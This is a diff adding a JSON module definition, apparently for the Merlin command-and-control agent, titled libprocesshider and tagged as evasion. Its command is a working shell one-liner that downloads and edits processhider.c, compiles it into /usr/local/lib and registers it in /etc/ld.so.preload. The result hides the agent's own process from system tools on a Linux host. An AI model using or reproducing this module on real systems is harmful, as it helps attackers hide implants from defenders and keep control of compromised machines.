@@ -1,0 +1,25 @@
+{
+    "base": {
+      "name": "libprocesshider",
+      "type": "standard",
+      "author": ["Tony M Lambert (@ForensicITGuy)"],
+      "credits": ["Gianluca Borello (@gianlucaborello)"],
+      "path": ["linux", "x64", "bash", "evasion", "libprocesshider.json"],
+      "platform": "linux",
+      "arch": "x64",
+      "lang": "bash",
+      "privilege": true,
+      "notes": "https://github.com/gianlucaborello/libprocesshider . Requires privileged access and gcc. The module will download the library, compile the shared object, place it in /usr/local/lib, and make a reference entry in /etc/ld.so.preload",
+      "remote": "https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c",
+      "local": ["data", "src", "gianlucaborello", "libprocesshider", "libprocesshider.c"],
+      "options": [
+        {"name": "pid", "value": "$PPID", "required": true, "flag": "", "description": "Process ID to hide. Default hides Merlin Agent."},
+        {"name": "fileName", "value": "libprocesshider", "required":  true, "flag": "", "description": "The file name that will be used for the .c file and .so module. Do not add a file extension"},
+        {"name":  "downloadLocation", "value" : "/tmp/", "required":  true, "flag": "", "description":  "The location where the .c file will be downloaded to. Must include trailing /"}
+      ],
+      "description": "Libprocesshider hides any process name, for the provided Process ID, under Linux using the ld preloader.",
+      "commands": [
+        "/bin/sh", "-c", "'wget -q -O {{downloadLocation.Value}}{{fileName.Value}}.c https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c && PPID_NAME=`cat /proc/{{pid.Value}}/comm` && sed -i \"s/evil_script.py/$PPID_NAME/g\" {{downloadLocation.Value}}{{fileName.Value}}.c && gcc -Wall -fPIC -shared -o /usr/local/lib/{{fileName.Value}}.so {{downloadLocation.Value}}{{fileName.Value}}.c -ldl && echo /usr/local/lib/{{fileName.Value}}.so >> /etc/ld.so.preload && rm {{downloadLocation.Value}}{{fileName.Value}}.c && echo \"$PPID_NAME process successfully hidden\"'"
+      ]
+    }
+  }
